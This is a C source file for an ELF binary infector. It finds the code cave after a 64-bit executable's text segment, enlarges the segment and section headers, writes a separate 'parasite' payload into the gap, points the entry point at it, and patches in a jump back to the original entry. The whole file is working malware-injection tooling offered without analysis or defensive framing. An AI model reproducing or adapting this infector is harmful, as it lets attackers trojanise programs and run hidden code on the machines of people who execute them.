#include <elf.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

Elf64_Addr parasite_load_address;
Elf64_Off parasite_offset;
uint64_t parasite_size;
int8_t *parasite_code;

Elf64_Addr original_entry_point;
Elf64_Off code_segment_end_offset;
uint64_t host_file_size;

unsigned int infected_count = 0;
int HOST_IS_EXECUTABLE = 0;
int HOST_IS_SHARED_OBJECT = 0;

void *mmapFile(char *filepath) {
  int fd = open(filepath, O_RDWR);
  if (fd < 0) {
    fprintf(stderr, "Failed to open %s\n", filepath);
    exit(1);
  }

  struct stat statbuf;
  lstat(filepath, &statbuf);
  host_file_size = statbuf.st_size;

  void *mapping =
      mmap(0, host_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (mapping == MAP_FAILED) {
    fprintf(stderr, "mmap() failed\n");
    exit(2);
  }
  close(fd);
  return mapping;
}

void loadParasite(char *parasite_path) {
  int parasite_fd = open(parasite_path, O_RDONLY);
  if (parasite_fd < 0) {
    fprintf(stderr, "Failed to open parasite\n");
    exit(6);
  }

  struct stat statbuf;
  lstat(parasite_path, &statbuf);
  parasite_size = statbuf.st_size;
  parasite_code = (int8_t *)malloc(parasite_size);
  if (!parasite_size) {
    fprintf(stderr, "Malloc failed\n");
    exit(7);
  }
  int rb = read(parasite_fd, parasite_code, parasite_size);
  if (rb < 0) {
    fprintf(stderr, "Failed to read() from parasite\n");
    exit(8);
  }
}

Elf64_Off GetPaddingSize(void *host_mapping) {
  Elf64_Ehdr *elf_header = (Elf64_Ehdr *)host_mapping;
  uint16_t pht_entry_count = elf_header->e_phnum;
  Elf64_Off pht_offset = elf_header->e_phoff;

  Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(host_mapping + pht_offset);
  uint16_t CODE_SEGMENT_FOUND = 0;
  for (int i = 0; i < pht_entry_count; ++i) {
    if (CODE_SEGMENT_FOUND == 0 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_X)) {
      CODE_SEGMENT_FOUND = 1;
      code_segment_end_offset = phdr_entry->p_offset + phdr_entry->p_filesz;
      parasite_offset = code_segment_end_offset;
      parasite_load_address = phdr_entry->p_vaddr + phdr_entry->p_filesz;
      phdr_entry->p_filesz += parasite_size;
      phdr_entry->p_memsz += parasite_size;
      // DEBUG
    }
    if (CODE_SEGMENT_FOUND == 1 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_W)) {
      return (phdr_entry->p_offset - parasite_offset);
    }
    ++phdr_entry;
  }
  return 0;
}

void PatchSHT(void *map_addr) {
  Elf64_Ehdr *elf_header = (Elf64_Ehdr *)map_addr;
  Elf64_Off sht_offset = elf_header->e_shoff;
  uint16_t sht_entry_count = elf_header->e_shnum;
  Elf64_Off current_section_end_offset;
  Elf64_Shdr *section_entry = (Elf64_Shdr *)(map_addr + sht_offset);

  for (int i = 0; i < sht_entry_count; ++i) {
    current_section_end_offset =
        section_entry->sh_offset + section_entry->sh_size;
    if (code_segment_end_offset == current_section_end_offset) {
      section_entry->sh_size += parasite_size;
      return;
    }
    ++section_entry;
  }
}

void FindAndReplace(uint8_t *parasite, long find_value, long replace_value) {
  uint8_t *ptr = parasite;

  for (int i = 0; i < parasite_size; ++i) {
    long current_QWORD = *((long *)(ptr + i));
    if (!(find_value ^ current_QWORD)) {
      *((long *)(ptr + i)) = replace_value;
      return;
    }
  }
}

void ElfParser(char *filepath) {
  void *host_mapping = mmapFile(filepath);
  Elf64_Ehdr *host_header = (Elf64_Ehdr *)host_mapping;
  if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE) {
    fprintf(stderr, "host is of incompatible type ET_REL or ET_CORE\n");
    exit(3);
  } else if (host_header->e_type == ET_EXEC) {
    HOST_IS_EXECUTABLE = 1;
    HOST_IS_SHARED_OBJECT = 0;
  } else if (host_header->e_type == ET_DYN) {
    HOST_IS_EXECUTABLE = 0;
    HOST_IS_SHARED_OBJECT = 1;
  }
  if (host_header->e_ident[EI_CLASS] == ELFCLASS32) {
    fprintf(stderr, "host is of unssuported type 32bits\n");
    exit(4);
  }

  if (HOST_IS_EXECUTABLE)
    loadParasite("payload");
  else if (HOST_IS_SHARED_OBJECT) {
    fprintf(stderr, "Flemme gros...\n");
    exit(99);
    /* loadParasite(parasite_path_for_so); */
  }

  Elf32_Off padding_size = GetPaddingSize(host_mapping);
  if (padding_size < parasite_size) {
    fprintf(stderr, "No cave big enough for the parasite...\n");
    exit(5);
  }

  original_entry_point = host_header->e_entry;
  if (HOST_IS_EXECUTABLE)
    host_header->e_entry = parasite_load_address;
  else if (HOST_IS_SHARED_OBJECT)
    host_header->e_entry = parasite_offset;

  PatchSHT(host_mapping);
  FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
  memcpy((host_mapping + parasite_offset), parasite_code, parasite_size);
  munmap(host_mapping, host_file_size);
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "Usage: %s <elf_file>\n", argv[0]);
    return 90;
  }
  ElfParser(argv[1]);
  return 0;
}
